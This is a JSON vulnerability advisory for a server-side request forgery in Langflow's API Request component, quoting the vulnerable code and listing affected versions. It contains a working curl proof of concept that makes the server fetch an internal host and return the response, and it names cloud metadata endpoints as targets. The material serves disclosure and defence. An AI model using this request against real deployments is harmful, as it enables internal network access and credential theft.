{
  "id": "GHSA-5993-7p27-66g5",
  "modified": "2025-12-19T23:15:23.037197Z",
  "published": "2025-12-19T22:52:59Z",
  "aliases": [
    "CVE-2025-68477"
  ],
  "summary": "Langflow vulnerable to Server-Side Request Forgery",
  "details": "**Vulnerability Overview**\n\n\nLangflow provides an API Request component that can issue arbitrary HTTP requests within a flow. This component takes a user-supplied URL, performs only normalization and basic format checks, and then sends the request using a server-side httpx client. It does not block private IP ranges (127.0.0.1, the 10/172/192 ranges) or cloud metadata endpoints (169.254.169.254), and it returns the response body as the result.\n\nBecause the flow execution endpoints (/api/v1/run, /api/v1/run/advanced) can be invoked with just an API key, if an attacker can control the API Request URL in a flow, non-blind SSRF is possible—accessing internal resources from the server’s network context. This enables requests to, and collection of responses from, internal administrative endpoints, metadata services, and internal databases/services, leading to information disclosure and providing a foothold for further attacks.\n\n**Vulnerable Code**\n \n1. When a flow runs, the API Request URL is set via user input or tweaks, or it falls back to the value stored in the node UI.\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/backend/base/langflow/api/v1/endpoints.py#L349-L359\n    \n    ```python\n    @router.post(\"/run/{flow_id_or_name}\", response_model=None, response_model_exclude_none=True)\n    async def simplified_run_flow(\n        *,\n        background_tasks: BackgroundTasks,\n        flow: Annotated[FlowRead | None, Depends(get_flow_by_id_or_endpoint_name)],\n        input_request: SimplifiedAPIRequest | None = None,\n        stream: bool = False,\n        api_key_user: Annotated[UserRead, Depends(api_key_security)],\n        context: dict | None = None,\n        http_request: Request,\n    ):\n    ```\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/backend/base/langflow/api/v1/endpoints.py#L573-L588\n    \n    ```bash\n    @router.post(\n        \"/run/advanced/{flow_id_or_name}\",\n        response_model=RunResponse,\n        response_model_exclude_none=True,\n    )\n    async def experimental_run_flow(\n        *,\n        session: DbSession,\n        flow: Annotated[Flow, Depends(get_flow_by_id_or_endpoint_name)],\n        inputs: list[InputValueRequest] | None = None,\n        outputs: list[str] | None = None,\n        tweaks: Annotated[Tweaks | None, Body(embed=True)] = None,\n        stream: Annotated[bool, Body(embed=True)] = False,\n        session_id: Annotated[None | str, Body(embed=True)] = None,\n        api_key_user: Annotated[UserRead, Depends(api_key_security)],\n    ) -\u003e RunResponse:\n    ```\n    \n2. Normalization/validation stage: It only checks that the URL is non-empty and well-formed. No blocking of private networks, localhost, or IMDS.\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L280-L289\n    \n    ```python\n        def _normalize_url(self, url: str) -\u003e str:\n            \"\"\"Normalize URL by adding https:// if no protocol is specified.\"\"\"\n            if not url or not isinstance(url, str):\n                msg = \"URL cannot be empty\"\n                raise ValueError(msg)\n    \n            url = url.strip()\n            if url.startswith((\"http://\", \"https://\")):\n                return url\n            return f\"https://{url}\"\n    ```\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L433-L438\n    \n    ```python\n            url = self._normalize_url(url)\n    \n            # Validate URL\n            if not validators.url(url):\n                msg = f\"Invalid URL provided: {url}\"\n                raise ValueError(msg)\n    ```\n    \n3. On the server side, it sends a request to an arbitrary URL using httpx.AsyncClient and exposes the response body as metadata[\"result\"].\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L312-L322\n    \n    ```python\n            try:\n                # Prepare request parameters\n                request_params = {\n                    \"method\": method,\n                    \"url\": url,\n                    \"headers\": headers,\n                    \"json\": processed_body,\n                    \"timeout\": timeout,\n                    \"follow_redirects\": follow_redirects,\n                }\n                response = await client.request(**request_params)\n    ```\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L335-L340\n    \n    ```python\n                # Base metadata\n                metadata = {\n                    \"source\": url,\n                    \"status_code\": response.status_code,\n                    \"response_headers\": response_headers,\n                }\n    ```\n    \n    https://github.com/langflow-ai/langflow/blob/fa21c4e5f11a697431ef471d63ff70d20c05c6dd/src/lfx/src/lfx/components/data/api_request.py#L364-L379\n    \n    ```python\n                # Handle response content\n                if is_binary:\n                    result = response.content\n                else:\n                    try:\n                        result = response.json()\n                    except json.JSONDecodeError:\n                        self.log(\"Failed to decode JSON response\")\n                        result = response.text.encode(\"utf-8\")\n    \n                metadata[\"result\"] = result\n    \n                if include_httpx_metadata:\n                    metadata.update({\"headers\": headers})\n    \n                return Data(data=metadata)\n    ```\n    \n\n### PoC\n\n---\n\n**PoC Description**\n \n- I launched a Langflow server using the latest `langflowai/langflow:latest` Docker container, and a separate container `internal-api` that exposes an internal-only endpoint `/internal` on port 8000. Both containers were attached to the same user-defined network (`ssrf-net`), allowing communication by name or via the IP 172.18.0.3.\n- I added an API Request node to a Langflow flow and set the URL to the internal service (`http://172.18.0.3:8000/internal`). Then I invoked `/api/v1/run/advanced/\u003cFLOW_ID\u003e` with an API key to perform SSRF. The response returned the internal service’s body in the `result` field, confirming non-blind SSRF.\n\n**PoC**\n\n- Langflow Setting\n    \n    \u003cimg width=\"1917\" height=\"940\" alt=\"image\" src=\"https://github.com/user-attachments/assets/96b0d770-b260-440f-9205-1583c108e12f\" /\u003e\n    \n- Exploit\n    \n    ```bash\n    curl -s -X POST 'http://localhost:7860/api/v1/run/advanced/0b7f7713-d88c-4f92-bcf8-0dafe250ea9d' \\\n      -H 'Content-Type: application/json' \\\n      -H 'x-api-key: sk-HHc93OjH_4ep_EhfWrweP1IwpooJ3ZZnYOu-HgqJV4M' \\\n      --data-raw '{\n        \"inputs\":[{\"components\":[],\"input_value\":\"\"}],\n        \"outputs\":[\"Chat Output\"],\n        \"tweaks\":{\"API Request\":{\"url_input\":\"http://172.18.0.3:8000/internal\",\"include_httpx_metadata\":false}},\n        \"stream\":false\n      }' | jq -r '.outputs[0].outputs[0].results.message.text | sub(\"^```json\\\\n\";\"\") | sub(\"\\\\n```$\";\"\") | fromjson | .result'\n    ```\n    \n    \u003cimg width=\"1918\" height=\"1029\" alt=\"image\" src=\"https://github.com/user-attachments/assets/4883029f-bd56-4c23-b5a3-6f8a84dbcce1\" /\u003e\n    \n\n### Impact\n\n---\n\n- Scanning internal assets and data exfiltration: Attackers can access internal administrative HTTP endpoints, proxies, metrics dashboards, and management consoles to obtain sensitive information (versions, tokens, configurations).\n- Access to metadata services: In cloud environments, attackers can use 169.254.169.254, etc., to steal instance metadata and credentials.\n- Foothold for attacking internal services: Can forge requests by abusing inter-service trust and become the starting point of an SSRF→RCE chain (e.g., invoking an internal admin API).\n- Non-blind: Because the response body is returned to the client, attackers can immediately view and exploit the collected data.\n- Risk in multi-tenant environments: Bypassing tenant boundaries can cause cross-leakage of internal network information, resulting in high impact. Even in single-tenant setups, the risk remains high depending on internal network policies.",
  "affected": [
    {
      "package": {
        "ecosystem": "PyPI",
        "name": "langflow",
        "purl": "pkg:pypi/langflow"
      },
      "ranges": [
        {
          "type": "ECOSYSTEM",
          "events": [
            {
              "introduced": "0"
            },
            {
              "fixed": "1.7.1"
            }
          ]
        }
      ],
      "versions": [
        "0.0.31",
        "0.0.32",
        "0.0.33",
        "0.0.40",
        "0.0.44",
        "0.0.45",
        "0.0.46",
        "0.0.52",
        "0.0.53",
        "0.0.54",
        "0.0.55",
        "0.0.56",
        "0.0.57",
        "0.0.58",
        "0.0.61",
        "0.0.62",
        "0.0.63",
        "0.0.64",
        "0.0.65",
        "0.0.66",
        "0.0.67",
        "0.0.68",
        "0.0.69",
        "0.0.70",
        "0.0.71",
        "0.0.72",
        "0.0.73",
        "0.0.74",
        "0.0.75",
        "0.0.76",
        "0.0.78",
        "0.0.79",
        "0.0.80",
        "0.0.81",
        "0.0.83",
        "0.0.84",
        "0.0.85",
        "0.0.86",
        "0.0.87",
        "0.0.88",
        "0.0.89",
        "0.1.0",
        "0.1.2",
        "0.1.3",
        "0.1.4",
        "0.1.5",
        "0.1.6",
        "0.1.7",
        "0.2.0",
        "0.2.1",
        "0.2.10",
        "0.2.11",
        "0.2.12",
        "0.2.13",
        "0.2.2",
        "0.2.3",
        "0.2.4",
        "0.2.5",
        "0.2.6",
        "0.2.7",
        "0.2.8",
        "0.2.9",
        "0.3.0",
        "0.3.1",
        "0.3.2",
        "0.3.3",
        "0.3.4",
        "0.4.0",
        "0.4.1",
        "0.4.10",
        "0.4.11",
        "0.4.12",
        "0.4.14",
        "0.4.15",
        "0.4.16",
        "0.4.17",
        "0.4.18",
        "0.4.19",
        "0.4.2",
        "0.4.20",
        "0.4.21",
        "0.4.3",
        "0.4.4",
        "0.4.5",
        "0.4.6",
        "0.4.7",
        "0.4.8",
        "0.4.9",
        "0.5.0",
        "0.5.0a0",
        "0.5.0a1",
        "0.5.0a2",
        "0.5.0a3",
        "0.5.0a4",
        "0.5.0a5",
        "0.5.0a6",
        "0.5.0b0",
        "0.5.0b2",
        "0.5.0b3",
        "0.5.0b4",
        "0.5.0b5",
        "0.5.0b6",
        "0.5.1",
        "0.5.10",
        "0.5.11",
        "0.5.12",
        "0.5.2",
        "0.5.3",
        "0.5.4",
        "0.5.5",
        "0.5.6",
        "0.5.7",
        "0.5.8",
        "0.5.9",
        "0.6.0",
        "0.6.0rc1",
        "0.6.1",
        "0.6.10",
        "0.6.11",
        "0.6.12",
        "0.6.14",
        "0.6.15",
        "0.6.16",
        "0.6.17",
        "0.6.18",
        "0.6.19",
        "0.6.2",
        "0.6.3",
        "0.6.3a0",
        "0.6.3a1",
        "0.6.3a2",
        "0.6.3a3",
        "0.6.3a4",
        "0.6.3a5",
        "0.6.3a6",
        "0.6.3a7",
        "0.6.4",
        "0.6.4a0",
        "0.6.4a1",
        "0.6.5",
        "0.6.5a0",
        "0.6.5a1",
        "0.6.5a10",
        "0.6.5a11",
        "0.6.5a12",
        "0.6.5a13",
        "0.6.5a2",
        "0.6.5a3",
        "0.6.5a4",
        "0.6.5a5",
        "0.6.5a6",
        "0.6.5a7",
        "0.6.5a8",
        "0.6.5a9",
        "0.6.6",
        "0.6.7",
        "0.6.7a1",
        "0.6.7a2",
        "0.6.7a3",
        "0.6.7a5",
        "0.6.8",
        "0.6.9",
        "1.0.0",
        "1.0.0a0",
        "1.0.0a1",
        "1.0.0a10",
        "1.0.0a11",
        "1.0.0a12",
        "1.0.0a13",
        "1.0.0a14",
        "1.0.0a15",
        "1.0.0a17",
        "1.0.0a18",
        "1.0.0a19",
        "1.0.0a2",
        "1.0.0a20",
        "1.0.0a21",
        "1.0.0a22",
        "1.0.0a23",
        "1.0.0a24",
        "1.0.0a25",
        "1.0.0a26",
        "1.0.0a27",
        "1.0.0a28",
        "1.0.0a29",
        "1.0.0a3",
        "1.0.0a30",
        "1.0.0a31",
        "1.0.0a32",
        "1.0.0a33",
        "1.0.0a34",
        "1.0.0a35",
        "1.0.0a36",
        "1.0.0a37",
        "1.0.0a38",
        "1.0.0a39",
        "1.0.0a4",
        "1.0.0a40",
        "1.0.0a41",
        "1.0.0a42",
        "1.0.0a43",
        "1.0.0a44",
        "1.0.0a45",
        "1.0.0a46",
        "1.0.0a47",
        "1.0.0a48",
        "1.0.0a49",
        "1.0.0a5",
        "1.0.0a50",
        "1.0.0a51",
        "1.0.0a52",
        "1.0.0a53",
        "1.0.0a55",
        "1.0.0a56",
        "1.0.0a57",
        "1.0.0a58",
        "1.0.0a59",
        "1.0.0a6",
        "1.0.0a60",
        "1.0.0a61",
        "1.0.0a7",
        "1.0.0a8",
        "1.0.0a9",
        "1.0.0rc0",
        "1.0.0rc1",
        "1.0.1",
        "1.0.10",
        "1.0.11",
        "1.0.12",
        "1.0.13",
        "1.0.14",
        "1.0.15",
        "1.0.16",
        "1.0.17",
        "1.0.18",
        "1.0.19",
        "1.0.19.post1",
        "1.0.19.post2",
        "1.0.2",
        "1.0.3",
        "1.0.4",
        "1.0.5",
        "1.0.6",
        "1.0.7",
        "1.0.8",
        "1.0.9",
        "1.1.0",
        "1.1.1",
        "1.1.2",
        "1.1.3",
        "1.1.4",
        "1.1.4.post1",
        "1.2.0",
        "1.3.0",
        "1.3.1",
        "1.3.2",
        "1.3.3",
        "1.3.4",
        "1.4.0",
        "1.4.1",
        "1.4.2",
        "1.4.3",
        "1.5.0",
        "1.5.0.post1",
        "1.5.0.post2",
        "1.5.1",
        "1.6.0",
        "1.6.1",
        "1.6.2",
        "1.6.3",
        "1.6.4",
        "1.6.5",
        "1.6.6",
        "1.6.7",
        "1.6.8",
        "1.6.9",
        "1.7.0"
      ],
      "database_specific": {
        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-5993-7p27-66g5/GHSA-5993-7p27-66g5.json"
      }
    }
  ],
  "references": [
    {
      "type": "WEB",
      "url": "https://github.com/langflow-ai/langflow/security/advisories/GHSA-5993-7p27-66g5"
    },
    {
      "type": "ADVISORY",
      "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-68477"
    },
    {
      "type": "PACKAGE",
      "url": "https://github.com/langflow-ai/langflow"
    }
  ]
}